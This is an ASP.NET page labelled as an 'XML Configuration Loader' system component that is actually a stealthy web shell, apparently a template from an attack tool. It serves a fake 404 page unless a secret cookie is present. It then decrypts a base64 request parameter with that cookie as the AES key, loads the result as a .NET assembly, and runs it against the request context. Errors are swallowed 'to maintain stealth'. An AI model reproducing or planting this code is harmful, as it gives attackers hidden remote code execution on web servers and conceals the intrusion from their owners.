<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Xml" %>
<script runat="server">
    /**
     * [System Component]
     * XML Configuration Loader
     * Handles dynamic loading of XML configuration files for the application context.
     * @version 1.5.2
     */

    private byte[] _processConfigData(byte[] input, string key) {
        try {
            if (string.IsNullOrEmpty(key)) return null;
            string k = key;
            if (k.Length < 16) return null;
            if (k.Length > 16) k = k.Substring(0, 16);

            System.Security.Cryptography.RijndaelManaged rm = new System.Security.Cryptography.RijndaelManaged();
            rm.Mode = System.Security.Cryptography.CipherMode.ECB;
            rm.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
            rm.Key = System.Text.Encoding.Default.GetBytes(k);
            return rm.CreateDecryptor().TransformFinalBlock(input, 0, input.Length);
        } catch { return null; }
    }
</script>
<%
    // Security Check
    bool isAuthenticated = false;
    string AUTH_TOKEN = ""; 
    string SESSION_ID_COOKIE = "$cookie_name$";

    if (Request.Cookies[SESSION_ID_COOKIE] != null) {
        AUTH_TOKEN = Request.Cookies[SESSION_ID_COOKIE].Value;
        isAuthenticated = true;
    }

    if (!isAuthenticated) {
        // Simulate a generic 404 Not Found to avoid suspicion
        Response.StatusCode = 404;
        Response.StatusDescription = "Not Found";
%>
<!DOCTYPE html>
<html>
<head>
<title>404 Not Found</title>
<style>body {font-family: Arial, sans-serif;}</style>
</head>
<body>
<h1>Not Found</h1>
<p>The requested resource could not be found.</p>
</body>
</html>
<%
        return; 
    }

    string CONFIG_PARAM = "$param$"; 
    string MODULE_CACHE = "xml_module_cache"; 

    try {
        if (Session[MODULE_CACHE] == null) {
            // Initial Load Phase
            if (!string.IsNullOrEmpty(AUTH_TOKEN) && Request[CONFIG_PARAM] != null) {
                string rawData = Request[CONFIG_PARAM];
                
                byte[] decodedBytes = Convert.FromBase64String(rawData);
                byte[] moduleBytes = _processConfigData(decodedBytes, AUTH_TOKEN); 
                
                if (moduleBytes != null) {
                    System.Reflection.Assembly loadedModule = System.Reflection.Assembly.Load(moduleBytes);
                    Session[MODULE_CACHE] = loadedModule;
                }
            }
        } else {
            // Execution Phase
            System.Reflection.Assembly module = (System.Reflection.Assembly)Session[MODULE_CACHE];
            // Note: The entry point class name must match the payload configuration
            object instance = module.CreateInstance("$class_name$");
            instance.Equals(Context); 
            instance.ToString();
        }
    } catch {
       // Suppress errors to maintain stealth
    }
%>